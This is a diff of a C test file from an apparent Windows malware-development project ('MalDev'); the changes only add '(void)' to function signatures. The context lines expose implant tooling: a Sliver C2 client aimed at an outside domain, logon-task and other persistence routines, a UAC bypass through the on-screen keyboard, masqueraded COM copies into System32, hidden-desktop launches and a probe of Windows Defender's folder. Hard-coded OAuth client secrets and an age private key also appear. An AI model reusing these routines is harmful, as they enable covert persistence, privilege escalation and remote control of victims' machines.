@@ -20,7 +20,7 @@ VOID Callback
 	//CopyFileWp(lpDllPath, szTempPath, FALSE);
 }
 
-VOID StartTaskThread()
+VOID StartTaskThread(VOID)
 {
 	HANDLE hEvent = NULL;
 
@@ -38,7 +38,7 @@ VOID StartTaskThread()
 	}
 }
 
-VOID test1() {
+VOID test1(void) {
 	HANDLE hThread = NULL;
 
 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartTaskThread, NULL, 0, NULL);
@@ -174,12 +174,12 @@ VOID test3
 	Sleep(1000000);
 }
 
-void test4() {
+void test4(void) {
 	PrintFormatA("%s\n", ConvertWcharToChar(L"Hello World"));
 	PrintFormatW(L"%s\n", ConvertCharToWchar("Hello World"));
 }
 
-void test5() {
+void test5(void) {
 	CHAR szUserAgent[] = "curl/7.83.1";
 	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
 	CHAR szClientSecret[] = "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";
@@ -191,7 +191,7 @@ void test5() {
 	//FreeDri
 }
 
-void test6() {
+void test6(void) {
 	CHAR szUserAgent[] = "curl/7.83.1";
 	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
 	CHAR szClientSecret[] = "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";
@@ -228,7 +228,7 @@ void test6() {
 	//FreeDr
 }
 
-void test7() {
+void test7(void) {
 	CHAR szKey[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
 	CHAR szNonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
 	PBYTE pCipherText = NULL;
@@ -243,7 +243,7 @@ void test7() {
 	//Chacha20Poly1305Decrypt(szKey, szNonce, szCipherText, szPlainText, lstrlenA("test"));
 }
 
-void test8() {
+void test8(void) {
 	BYTE Buffer[] = { 152, 160, 197, 161, 181, 205, 97, 250, 161, 153 };
 	LPSTR lpHexString = NULL;
 	PBYTE pByteArray = NULL;
@@ -261,7 +261,7 @@ void test8() {
 	FREE(pByteArray);
 }
 
-void test9() {
+void test9(void) {
 	PBYTE pHashDigest = ComputeSHA256("Hello World", lstrlenA("Hello World"));
 	LPSTR lpHexDigest = ConvertToHexString(pHashDigest, 32);
 	PrintFormatA("Hex digest: %s\n", lpHexDigest);
@@ -270,7 +270,7 @@ void test9() {
 	return;
 }
 
-void test10() {
+void test10(void) {
 	LPSTR lpOutput = NULL;
 	PBYTE HMac = GenerateHmacSHA256("Secret Key", lstrlenA("Secret Key"), "Hello World", lstrlenA("Hello World"));
 	lpOutput = ConvertToHexString(HMac, 32);
@@ -279,7 +279,7 @@ void test10() {
 	return;
 }
 
-void test11() {
+void test11(void) {
 	CHAR szInput[] = "age1c6j0mssdmznty6ahkckmhwszhd3lquupd5rqxnzlucma482yvspsengc59";
 	PBYTE pOutput;
 	DWORD cbOutput = 0;
@@ -293,7 +293,7 @@ void test11() {
 	return;
 }
 
-void test12() {
+void test12(void) {
 	BYTE a[] = { 0x4c, 0x4a, 0x3a, 0x8a, 0xa4, 0xc, 0xa7, 0xe9, 0xc8, 0x50, 0xf9, 0x2e, 0x3c, 0x5b, 0xa3, 0x2, 0x21, 0xc0, 0x4a, 0x6a, 0xe3, 0x3e, 0xb6, 0xc0, 0x26, 0x5f, 0xb2, 0xb9, 0xc4, 0xf0, 0x92, 0xa7 };
 	BYTE b[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
 	BYTE c[0x20] = { 0 };
@@ -303,7 +303,7 @@ void test12() {
 	FREE(lpOutput);
 }
 
-void test13() {
+void test13(void) {
 	CHAR szInfo[] = "hkdf-example";
 	CHAR szKey[] = "input key";
 	BYTE Salt[] = { 188, 49, 67, 71, 174, 231, 83, 62, 183, 47, 136, 245, 54, 178, 101, 135, 50, 72, 41, 97, 103, 184, 5, 86, 223, 122, 35, 123, 76, 235, 87, 30 };
@@ -318,7 +318,7 @@ void test13() {
 	return;
 }
 
-void test14() {
+void test14(void) {
 	BYTE FileKey[] = { 0xca, 0x98, 0xb5, 0xff, 0x69, 0xc9, 0x5a, 0xb7, 0x19, 0x67, 0xc6, 0xe4, 0x33, 0x5c, 0x68, 0xf5 };
 	BYTE TheirPubKey[] = { 0xdd, 0x55, 0x44, 0xfc, 0xae, 0xae, 0x32, 0xea, 0xd, 0x6, 0x2e, 0x7b, 0x13, 0x46, 0xca, 0x53, 0xb5, 0xde, 0xc, 0x53, 0x2e, 0x8c, 0x6, 0xbd, 0xbc, 0x58, 0x9e, 0x6e, 0xa9, 0xa7, 0x8d, 0x61 };
 	PSTANZA pResult = NULL;
@@ -331,7 +331,7 @@ void test14() {
 	FREE(pResult);
 }
 
-void test15() {
+void test15(void) {
 	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
 	BYTE PlainText[] = { 10, 32, 160, 8, 226, 25, 133, 57, 45, 26, 159, 50, 208, 44, 0, 207, 249, 243, 54, 158, 66, 199, 50, 184, 3, 16, 128, 176, 16, 14, 190, 185, 202, 227 };
 	DWORD cbOutput = 0;
@@ -342,11 +342,11 @@ void test15() {
 	FREE(pCipherText);
 }
 
-void test16() {
+void test16(void) {
 	MessageBoxW(NULL, L"Hello World", L"Title", MB_OK);
 }
 
-void test17() {
+void test17(void) {
 	CHAR wszInput[] = "As before, a side effect of this design is that when a function returns the same value as one of its callees, it needs to read the return value from the callee from its own activation record, then place it back onto the stack at a return value in its caller’s activation record. Tail call optimizations (TCO) thus remain impossible.";
 	LPSTR lpOutput = NULL;
 
@@ -357,18 +357,18 @@ void test17() {
 	FREE(lpOutput);
 }
 
-void test18() {
+void test18(void) {
 	LPSTR lpOutput = GenGUIDStrA();
 	PrintFormatA("%s\n", lpOutput);
 	FREE(lpOutput);
 }
 
-void test19() {
+void test19(void) {
 	WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
 	return;
 }
 
-void test20() {
+void test20(void) {
 	LPWSTR* pArray = NULL;
 	DWORD dwSize = 0;
 
@@ -504,7 +504,7 @@ CLEANUP:
 	return;
 }
 
-void test22() {
+void test22(void) {
 	for (DWORD i = 0; i < 1000; i++) {
 		PrintFormatW(L"#%d: ", i);
 		IsSystemLock();
@@ -512,16 +512,16 @@ void test22() {
 	}
 }
 
-void test23() {
+void test23(void) {
 	BypassByOsk("cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"");
 }
 
-void test24() {
+void test24(void) {
 	WCHAR wszCommandLine[] = L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\1Test.exe";
 	CreateProcessWithDesktop(wszCommandLine, L"Hidden Desktop");
 }
 
-void test25() {
+void test25(void) {
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 
@@ -543,7 +543,7 @@ void test25() {
 	}
 }
 
-void test26() {
+void test26(void) {
 	SIZE_T cbList = 0;
 	PPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
 
@@ -561,15 +561,15 @@ void test26() {
 	}
 }
 
-void test27() {
+void test27(void) {
 	LogError(L"Hello World");
 }
 
-void test28() {
+void test28(void) {
 	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
 }
 
-void test29()
+void test29(void)
 {
 	BOOL                cond = FALSE;
 	IFileOperation* FileOperation1 = NULL;
@@ -665,7 +665,7 @@ void test29()
 	CoUninitialize();
 }
 
-void test30() {
+void test30(void) {
 	PBYTE pBuffer = NULL;
 	DWORD cbBuffer = 0;
 
@@ -674,7 +674,7 @@ void test30() {
 	FREE(pBuffer);
 }
 
-void test31() {
+void test31(void) {
 	LPWSTR List[] = { L"Zalo.exe", L"SystemInformer.exe", L"chrome.exe", L"steam.exe", L"wallpaper32.exe", L"SnippingTool.exe" };
 	BOOL Result = FALSE;
 
@@ -682,15 +682,15 @@ void test31() {
 	PrintFormatW(L"Result = %d\n", Result);
 }
 
-void test32() {
+void test32(void) {
 	CreateAtLogonTask(L"Calc", L"C:\\Windows\\System32\\calc.exe");
 }
 
-void test33() {
+void test33(void) {
 	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
 }
 
-void test34() {
+void test34(void) {
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 
@@ -702,7 +702,7 @@ void test34() {
 	CloseHandle(pi.hProcess);
 }
 
-void test35() {
+void test35(void) {
 	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
 	BYTE PrivateKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
 	BYTE PublicKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
@@ -715,7 +715,7 @@ void test35() {
 	FREE(pCipherText);
 }
 
-void test36() {
+void test36(void) {
 	CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
 	DWORD cbOutput = 0;
 	LPSTR lpOutput = NULL;
@@ -725,7 +725,7 @@ void test36() {
 	FREE(lpOutput);
 }
 
-void test37() {
+void test37(void) {
 	BYTE CipherText[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 144, 144, 76, 102, 126, 178, 220, 49, 255, 50, 134, 6, 178, 19, 111, 101, 235, 109, 142, 220, 80, 109, 83, 183, 239, 211, 11, 38, 88, 81, 137, 198, 77, 175, 46, 180, 204, 247, 145, 70, 196, 223, 12, 79, 33, 202, 34, 241, 49, 43, 148, 167, 117, 64, 16, 81, 209, 90, 0, 122, 22, 15, 152, 4, 231, 162, 192, 64, 243, 108, 238, 189, 23, 193, 98, 223, 142, 236, 212, 44, 235, 226, 231, 187, 60, 154, 189, 50, 249, 188, 89, 56, 43, 67, 65, 253, 119, 243, 213, 25, 193, 238, 178, 173, 183, 205, 29, 36, 124, 149, 53, 236, 5, 153, 56, 160, 183, 249, 239, 241, 147, 240, 71, 202, 142, 114, 243, 109, 6, 173, 198, 119, 218, 123, 240, 242, 190, 91, 186, 14, 18, 149, 249, 58, 12, 16, 119, 211 };
 	LPSTR lpOutput = NULL;
 
@@ -734,7 +734,7 @@ void test37() {
 	FREE(lpOutput);
 }
 
-void test38() {
+void test38(void) {
 	CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
 	DWORD cbOutput = 0;
 	PBYTE pOutput = NULL;
@@ -744,13 +744,13 @@ void test38() {
 	FREE(pOutput);
 }
 
-void test39() {
+void test39(void) {
 	/*BYTE Msg[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3, 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
 	CHAR szServerMinisignPublicKey[] = "untrusted comment: minisign public key: 8BC040541382CDF1\nRWTxzYITVEDAi0WSY4oCDg/kTkSnjDCcsPuXF4xm/kyh434uy6PHFiUq";
 	SessionDecrypt(NULL, Msg, _countof(Msg), szServerMinisignPublicKey, NULL);;*/
 }
 
-void test40() {
+void test40(void) {
 	CHAR wszInput[] = "aaaaaaNewaaaa to ubuntu and servers. I just finished installing a new ubuntu server and added LAMP. I can assess the webpage that I am hosting by typing in the web browser the IP address of the server. what I would like to know is how to access the same web page locally on my network from another computer using a name instead of the IP address.aaa";
 	LPSTR* pResult = NULL;
 	DWORD cbResult = 0;
@@ -763,7 +763,7 @@ void test40() {
 	}
 }
 
-void test41() {
+void test41(void) {
 	CHAR szInpit[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
 	PMINISIGN_PUB_KEY pResult = NULL;
 	pResult = DecodeMinisignPublicKey(szInpit);
@@ -771,7 +771,7 @@ void test41() {
 	FREE(pResult);
 }
 
-void test42() {
+void test42(void) {
 	BYTE Data[] = "GeeksForGeeks";
 	PBYTE pDigest = NULL;
 
@@ -785,7 +785,7 @@ void test42() {
 //#include "D:\\Temp\\ed25519\\src\\sc.h"
 typedef int (WINAPI* ED25519_VERIFY)(PBYTE, PBYTE, SIZE_T, PBYTE);
 
-void test43() {
+void test43(void) {
 	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
 	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
 	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
@@ -800,7 +800,7 @@ void test43() {
 	}
 }
 
-void test44() {
+void test44(void) {
 	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
 	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
 	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
@@ -817,7 +817,7 @@ void test44() {
 	}
 }
 
-void test45() {
+void test45(void) {
 	BYTE pSessionKey[] = { 27, 77, 147, 18, 250, 64, 204, 175, 58, 32, 210, 175, 62, 24, 182, 214, 170, 115, 195, 221, 244, 178, 189, 132, 38, 103, 156, 124, 12, 1, 2, 19 };
 	PSLIVER_HTTP_CLIENT pClient = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
 	BYTE Msg[] = { 69, 100, 209, 158, 5, 31, 113, 166, 249, 84, 225, 239, 116, 125, 149, 140, 204, 119, 2, 31, 96, 107, 139, 28, 67, 159, 249, 103, 138, 114, 123, 126, 11, 155, 121, 78, 161, 59, 206, 84, 190, 180, 194, 199, 15, 91, 104, 221, 196, 235, 203, 151, 198, 99, 144, 167, 156, 84, 51, 111, 141, 53, 151, 249, 190, 17, 155, 127, 154, 28, 236, 178, 59, 12, 229, 21, 226, 234, 18, 14, 165, 8, 26, 86, 32, 236, 76, 24, 218, 159, 240, 218, 61, 237, 211, 254, 101, 39, 216, 59, 150, 27, 234, 36, 1, 61, 128, 112, 38, 232, 135, 122, 195, 208, 28, 127, 246, 139, 135, 71, 3, 162, 178, 253, 172, 161, 43, 77, 239, 188, 217, 1, 3, 180 };
@@ -837,7 +837,7 @@ void test45() {
 	FREE(pClient);
 }
 
-void test46() {
+void test46(void) {
 	BYTE CipherText[] = { 166, 79, 199, 13, 85, 218, 251, 232, 139, 101, 168, 155, 94, 25, 228, 162, 11, 94, 32, 191, 233, 46, 57, 97, 121, 197, 154, 137, 5, 34, 76, 247, 150, 52, 58, 39, 239, 16, 60, 116, 166, 48, 14, 174, 8, 51, 158, 228, 88, 229, 61, 76, 203, 243, 127, 192, 97, 237, 232, 91, 29, 13, 168, 63, 8, 166, 180, 218, 130, 83, 246, 108, 153, 165, 8, 228, 41, 110, 24, 255, 201, 79 };
 	BYTE Key[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
 	BYTE Nonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
@@ -849,13 +849,13 @@ void test46() {
 	FREE(pPlainText);
 }
 
-void test47() {
+void test47(void) {
 	CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";
 
 	PersistenceMethod1(szCommandLine);
 }
 
-void test48() {
+void test48(void) {
 	PHTTP_CLIENT pHttpClient = NULL;
 	HTTP_CONFIG HttpConfig;
 	LPSTR lpProxy = NULL;
@@ -909,7 +909,7 @@ CLEANUP:
 	FreeHttpClient(pHttpClient);
 }
 
-void test49() {
+void test49(void) {
 	LPWSTR lpProxyUrl = NULL;
 
 	if (!WinHttpDetectAutoProxyConfigUrl(WINHTTP_AUTO_DETECT_TYPE_DNS_A, &lpProxyUrl)) {
@@ -921,7 +921,7 @@ void test49() {
 	GlobalFree(lpProxyUrl);
 }
 
-void test50() {
+void test50(void) {
 	WINHTTP_PROXY_INFO ProxyDefault;
 
 	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
@@ -934,7 +934,7 @@ void test50() {
 	PrintFormatW(L"lpszProxyBypass: %s", ProxyDefault.lpszProxyBypass);
 }
 
-void test51() {
+void test51(void) {
 	PSLIVER_HTTP_CLIENT pHttpClient = NULL;
 	pHttpClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
 	if (pHttpClient == NULL) {
@@ -945,7 +945,7 @@ void test51() {
 	FreeSliverHttpClient(pHttpClient);
 }
 
-void test52() {
+void test52(void) {
 	/*BYTE SessionKey[] = { 0x95, 0x7d, 0x45, 0x5f, 0x5c, 0xed, 0x74, 0xdf, 0x8, 0xcf, 0x10, 0x15, 0xa1, 0xb1, 0x73, 0x8b, 0x45, 0xac, 0x74, 0x57, 0x71, 0x48, 0x36, 0x4d, 0xe8, 0x49, 0xad, 0x2f, 0x18, 0x4f, 0xce, 0x11 };
 	BYTE Nonce[] = { 0x4f, 0x6a, 0xa6, 0x7e, 0x22, 0x82, 0x3a, 0x63, 0xa1, 0x78, 0xae, 0xe0 };
 	BYTE CipherText[] = { 0xdd, 0xe5, 0xfc, 0x4c, 0xb2, 0x28, 0xe, 0xff, 0x2, 0x2b, 0x8f, 0x56, 0xaf, 0x35, 0x43, 0x4a, 0xde, 0x98, 0x3f, 0xd1, 0xb5, 0x84, 0x77, 0xa3, 0x9e, 0x52, 0xfc, 0x7d, 0xa2, 0x44, 0xaa, 0x92, 0x82, 0x85, 0xc2, 0xdd, 0x43, 0x83, 0x37, 0x18, 0xf0, 0xb, 0x2e, 0x6b, 0x6b, 0xdc, 0xbc, 0x53 };*/
@@ -968,7 +968,7 @@ void test52() {
 	FREE(pPlainText);
 }
 
-void test53() {
+void test53(void) {
 	LPSTR lpSid = NULL;
 
 	lpSid = GetCurrentUserSID();
@@ -980,7 +980,7 @@ void test53() {
 	FREE(lpSid);
 }
 
-void test54() {
+void test54(void) {
 	LPSTR lpSid = NULL;
 
 	lpSid = GetCurrentProcessUserSID();
@@ -1000,7 +1000,7 @@ void test54() {
 	FREE(lpSid);
 }
 
-void test55() {
+void test55(void) {
 	/*CHAR szHostName[0x100];
 
 	WSAStartup();
@@ -1009,7 +1009,7 @@ void test55() {
 	PrintFormatA("%s\n", szHostName);*/
 }
 
-void test56() {
+void test56(void) {
 	PBYTE pOutput = NULL;
 	DWORD cbOutput = 0;
 
@@ -1017,7 +1017,7 @@ void test56() {
 	HexDump(pOutput, cbOutput);
 }
 
-void test57() {
+void test57(void) {
 	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pOutput = NULL;
 	DWORD cbOutput = 0;
@@ -1029,7 +1029,7 @@ void test57() {
 	FreeSliverHttpClient(pSliverClient);
 }
 
-void test58() {
+void test58(void) {
 	BYTE MarshalledData[] = { 10, 5, 1, 2, 3, 4, 5, 18, 147, 2, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 24, 188, 181, 226, 179, 197, 198, 4, 32, 1, 48, 213, 204, 221, 195, 8, 58, 11, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 58, 11, 84, 114, 97, 110, 103, 32, 78, 104, 117, 110, 103, 58, 10, 78, 103, 111, 99, 32, 72, 117, 121, 101, 110, 66, 25, 10, 10, 72, 97, 110, 103, 32, 84, 114, 97, 110, 103, 10, 11, 84, 114, 97, 110, 32, 80, 104, 117, 111, 110, 103, 74, 10, 0, 7, 8, 9, 153, 239, 213, 154, 147, 2 };
 	PPBElement ElementList[9];
 	DWORD i = 0;
@@ -1059,7 +1059,7 @@ void test58() {
 	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
 }
 
-void test59() {
+void test59(void) {
 	BYTE MarshalledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
 	PPBElement ElementList[4];
 	DWORD i = 0;
@@ -1081,7 +1081,7 @@ void test59() {
 	PrintFormatA("pResult->UnknownMessageType: 0x%08llx", pResult->uUnknownMessageType);
 }
 
-void test60() {
+void test60(void) {
 	BYTE MarshalledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
 	PPBElement ElementList[2];
 	DWORD i = 0;
@@ -1113,11 +1113,11 @@ void test60() {
 	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
 }
 
-void test61() {
+void test61(void) {
 	PrintFormatA("%d\n", RtlGetCurrentProcessorNumber());
 }
 
-void test62() {
+void test62(void) {
 	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pMarshalledRegisterInfo = NULL;
 	DWORD cbMarshalledRegisterInfo = 0;
@@ -1161,7 +1161,7 @@ void test63
 	PrintFormatW(L"Main handler\n");
 }
 
-void test64() {
+void test64(void) {
 	PSLIVER_THREADPOOL pSliverPool = InitializeSliverThreadPool();
 	PTP_WORK pWork = NULL;
 	DWORD i = 0;
@@ -1190,7 +1190,7 @@ CLEANUP:
 	return;
 }
 
-void test65() {
+void test65(void) {
 	CHAR szBuffer[] = "C:\\Users";
 	LPSTR lpRespData = NULL;
 
@@ -1207,14 +1207,14 @@ void test65() {
 	return;
 }
 
-void test66() {
+void test66(void) {
 	LPWSTR lpBuffer = NULL;
 
 	lpBuffer = GetEnvironmentStringsW();
 	FreeEnvironmentStringsW(lpBuffer);
 }
 
-void test67() {
+void test67(void) {
 	ENVELOPE Envelope;
 	BYTE Buffer[] = { 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 51, 51, 98, 101, 53, 100, 45, 49, 48, 50, 100, 45, 52, 99, 56, 57, 45, 57, 51, 49, 100, 45, 51, 49, 53, 48, 97, 97, 53, 56, 53, 52, 55, 53 };
 	PENVELOPE pResult = NULL;
@@ -1227,11 +1227,11 @@ void test67() {
 	FreeEnvelope(pResult);
 }
 
-void test68() {
+void test68(void) {
 	RaiseException(EXCEPTION_BREAKPOINT, EXCEPTION_NONCONTINUABLE, 0, NULL);
 }
 
-void test69() {
+void test69(void) {
 	LPSTR lpBuffer = ALLOC(MAX_PATH);
 	DWORD dwReturnedLength = 0;
 
@@ -1241,15 +1241,15 @@ void test69() {
 	FREE(lpBuffer);
 }
 
-void test70() {
+void test70(void) {
 	DeletePath(L"C:\\Users\\Admin\\Desktop\\Test");
 }
 
-void test71() {
+void test71(void) {
 	MovePath(L"C:\\Users\\Admin\\Desktop\\Test", L"C:\\Users\\Admin\\Desktop\\Test2\\Test3");
 }
 
-void test72() {
+void test72(void) {
 	WCHAR wszPath[] = L"C:\\Program Files\\Windows Defender";
 
 	BOOL Result = CanPathBeDeleted(wszPath);
@@ -1260,7 +1260,7 @@ void test72() {
 	PrintFormatW(L"Result: %d\n", Result);
 }
 
-void test73() {
+void test73(void) {
 	LPSTR lpOutput = NULL;
 
 	lpOutput = FormatErrorCode(5);
@@ -1268,11 +1268,11 @@ void test73() {
 	FREE(lpOutput);
 }
 
-void test74() {
+void test74(void) {
 	IfconfigHandler(NULL);
 }
 
-void test75() {
+void test75(void) {
 	HANDLE hProcess = NULL;
 	LPSTR lpOutput = NULL;
 
@@ -1287,7 +1287,7 @@ void test75() {
 	CloseHandle(hProcess);
 }
 
-void test76() {
+void test76(void) {
 	DWORD cbVersionInfo = 0;
 	WCHAR wszPath[] = L"C:\\Users\\Admin\\AppData\\Local\\Programs\\Zalo\\Zalo-24.8.5\\Zalo.exe";
 	DWORD dwHandle = 0;
@@ -1340,7 +1340,7 @@ CLEANUP:
 	return;
 }
 
-void test77() {
+void test77(void) {
 	HANDLE hProc = NULL;
 	LPSTR lpCommandLine = NULL;
 
@@ -1356,11 +1356,11 @@ void test77() {
 	FREE(lpCommandLine);
 }
 
-void test78() {
+void test78(void) {
 	SHCreateDirectory(NULL, L"C:\\Users\\Admin\\Desktop\\Test1\\Test2");
 }
 
-void test79() {
+void test79(void) {
 	PNETWORK_CONNECTION pConnections = NULL;
 	PNETWORK_CONNECTION pConnectionEnrty = NULL;
 	DWORD dwNumberOfConnections = 0;
@@ -1385,7 +1385,7 @@ void test79() {
 	}
 }
 
-void test80() {
+void test80(void) {
